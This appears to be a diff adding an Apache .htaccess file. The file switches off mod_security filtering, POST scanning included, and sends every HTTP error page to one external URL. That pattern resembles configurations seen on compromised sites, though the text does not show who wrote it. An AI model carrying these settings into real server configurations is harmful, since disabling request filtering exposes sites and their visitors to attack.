@@ -1,0 +1,28 @@
+<IfModule mod_security.c>
+SecFilterEngine Off
+SecFilterScanPOST Off
+</IfModule>
+
+RewriteEngine On
+# Error Pages
+ErrorDocument 400 http://datarar.com/hizmetler
+ErrorDocument 401 http://datarar.com/hizmetler
+ErrorDocument 402 http://datarar.com/hizmetler
+ErrorDocument 403 http://datarar.com/hizmetler
+ErrorDocument 404 http://datarar.com/hizmetler
+ErrorDocument 405 http://datarar.com/hizmetler
+ErrorDocument 406 http://datarar.com/hizmetler
+ErrorDocument 407 http://datarar.com/hizmetler
+ErrorDocument 408 http://datarar.com/hizmetler
+ErrorDocument 409 http://datarar.com/hizmetler
+ErrorDocument 410 http://datarar.com/hizmetler
+ErrorDocument 411 http://datarar.com/hizmetler
+ErrorDocument 412 http://datarar.com/hizmetler
+ErrorDocument 413 http://datarar.com/hizmetler
+ErrorDocument 414 http://datarar.com/hizmetler
+ErrorDocument 500 http://datarar.com/hizmetler
+ErrorDocument 501 http://datarar.com/hizmetler
+ErrorDocument 502 http://datarar.com/hizmetler
+ErrorDocument 503 http://datarar.com/hizmetler
+ErrorDocument 504 http://datarar.com/hizmetler
+ErrorDocument 505 http://datarar.com/hizmetler
